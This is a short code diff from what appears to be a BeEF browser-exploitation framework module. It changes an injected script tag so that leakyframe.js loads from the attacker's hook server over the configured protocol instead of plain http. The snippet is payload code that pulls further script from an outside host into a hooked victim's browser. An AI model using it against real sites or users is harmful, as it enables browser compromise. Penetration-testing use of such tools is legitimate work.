@@ -24,7 +24,7 @@ beef.execute(function() {
     var leakyscript = document.createElement('script');
 
     leakyscript.setAttribute('type', 'text/javascript');
-    leakyscript.setAttribute('src', 'http://'+beef.net.host+':'+beef.net.port+'/leakyframe.js');
+    leakyscript.setAttribute('src', beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/leakyframe.js');
     var theparent = document.getElementsByTagName('head')[0];
     theparent.insertBefore(leakyscript, theparent.firstChild);
   }
